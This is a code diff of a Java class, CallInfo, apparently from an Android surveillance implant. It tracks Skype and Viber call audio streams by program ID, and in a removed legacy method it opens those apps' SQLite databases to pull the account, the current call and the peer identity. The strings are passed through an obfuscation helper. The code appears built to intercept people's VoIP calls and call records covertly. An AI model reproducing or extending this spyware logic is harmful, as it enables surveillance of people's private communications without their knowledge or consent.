@@ -61,7 +61,6 @@ public class CallInfo {
 	}
 	public boolean setStreamPid( int pid) {
 
-
 		if (pid != this.programId) {
 
 			if (this.programId != 0) {
@@ -72,7 +71,9 @@ public class CallInfo {
 				return false;
 			}
 
-			this.programId = pid;
+			if(pid != 0) {
+				this.programId = pid;
+			}
 		}
 
 		return true;
@@ -84,6 +85,15 @@ public class CallInfo {
 			return true;
 		}
 
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (update), programId: " + this.programId);
+		}
+
+		if(!this.incoming && this.programId == 0 && end){
+			// HACK: fix this thing.
+			// the last local viber chunk has pid 0, we fix it here
+			this.programId = 0x0148;
+		}
 
 		if ( this.programId == 0x0146 ) {
 			if (Cfg.DELAY_SKYPE_CALL) {
@@ -139,7 +149,7 @@ public class CallInfo {
 
 				return ret;
 			}
-		} else if ( this.programId == 0x0148) {
+		} else if ( this.programId == 0x0148  ) {
 			boolean ret = false;
 			this.processName = M.e("com.viber.voip");
 			this.delay = true;
@@ -173,103 +183,5 @@ public class CallInfo {
 		}
 		return false;
 	}
-	public boolean update_old(boolean end) {
 
-		// RunningAppProcessInfo fore = runningProcesses.getForeground();
-		if (this.valid) {
-			return true;
-		}
-
-		ListenerProcess lp = ListenerProcess.self();
-		if (Cfg.DEBUG_SPECIFIC) {
-			Check.log(TAG + " (update):launced");
-		}
-		if (lp.isRunning(M.e("com.skype.raider"))) {
-			if (Cfg.DELAY_SKYPE_CALL) {
-
-				this.processName = M.e("com.skype.raider");
-				// open DB
-
-				this.programId = 0x0146;
-				this.delay = true;
-				this.realRate = false;
-
-				boolean ret = false;
-				if (end) {
-					String account = ChatSkype.readAccount();
-					this.account = account;
-
-					GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
-					if (helper != null) {
-						ret = ChatSkype.getCurrentCall(helper, this);
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (updateCallInfo): id: " + this.id + " peer: " + this.peer);
-						}
-					}
-				} else {
-					this.account = M.e("delay");
-					this.peer = M.e("delay");
-					ret = true;
-				}
-
-				return ret;
-			} else {
-				
-				if (end) {
-					return true;
-				}
-				this.processName = M.e("com.skype.raider");
-				// open DB
-				String account = ChatSkype.readAccount();
-				this.account = account;
-				this.programId = 0x0146;
-				this.delay = false;
-				this.realRate = false;
-
-				GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
-
-				boolean ret = false;
-				if (helper != null) {
-					ret = ChatSkype.getCurrentCall(helper, this);
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " SKYPE (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:"+ ret);
-					}
-				}
-
-				return ret;
-			}
-		} else if (lp.isRunning(M.e("com.viber.voip"))) {
-			boolean ret = false;
-			this.processName = M.e("com.viber.voip");
-			this.delay = true;
-			this.realRate = true;
-
-			// open DB
-			this.programId = 0x0148;
-			if (end) {
-				String account = ChatViber.readAccount();
-				this.account = account;
-				GenericSqliteHelper helper = ChatViber.openViberDBHelperCall();
-
-				if (helper != null) {
-					ret = ChatViber.getCurrentCall(helper, this);
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (updateCallInfo) id: " + this.id);
-				}
-			} else {
-				this.account = M.e("delay");
-				this.peer = M.e("delay");
-				ret = true;
-			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " VIBER (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:"+ ret);
-			}
-
-			return ret;
-
-		}
-		return false;
-	}
 }
